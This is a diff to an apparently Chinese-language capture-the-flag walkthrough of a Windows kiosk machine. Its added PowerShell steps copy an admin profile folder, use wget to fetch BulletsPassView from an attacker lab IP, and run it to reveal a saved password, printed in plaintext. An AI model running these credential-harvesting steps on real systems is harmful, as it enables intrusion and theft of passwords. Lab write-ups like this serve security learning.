@@ -68,7 +68,14 @@ Host script results:
 
 #### 我们很快就记起，我们无法访问文件系统的其余部分，因此我们必须先进行复制将包含概要文件的_admin文件夹放到Downloads文件夹中。让我们使用现有的PowerShell窗口。
 ```
+PS C:\Users\kioskUser0\Downloads> cd 'C:\Program Files (x86)\Remote Desktop Plus'  
 PS C:\Program Files (x86)\Remote Desktop Plus> copy -r C:\_admin\ C:\Users\kioskUser0\Downloads\
+PS C:\Program Files (x86)\Remote Desktop Plus> dir
+  Directory: C:\Program Files (x86)\Remote Desktop Plus
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/13/2018  10:47 PM         267264 rdp.exe
+PS C:\Program Files (x86)\Remote Desktop Plus> ./rdp.exe
 ```
 #### 复制完文件夹后，让我们从Remote Desktop Plus加载profiles.xml
 
@@ -88,3 +95,19 @@ Serving HTTP on :: port 8000 (http://[::]:8000/) ...
 
 ```
 #### 在远程机器的C:\目录下创建一个名为temp的文件夹后，让我们在本地启动一个Python web服务器，在我们下载BulletsPassView的同一个文件夹中。
+```
+PS C:\Program Files (x86)\Remote Desktop Plus> cd ../..
+PS C:\> mkdir temp
+Directory: C:\
+Mode                 LastWriteTime         Length Name
+d-----        12/22/2025   1:32 AM                temp
+PS C:\> cd temp
+PS C:\temp> wget http://10.10.14.190:8002/BulletsPassView.exe -O BPV.exe
+PS C:\temp> ls
+Directory: C:\temp
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        12/22/2025   1:37 AM          71776 BPV.exe
+PS C:\temp> ./BPV.exe
+```
+#### 程序显示隐藏密码为Twisting3021。注意：为了正确显示密码，远程桌面Plus需要在编辑中前面展示的配置文件页面。我们可以推测这个密码属于名为admin的用户。
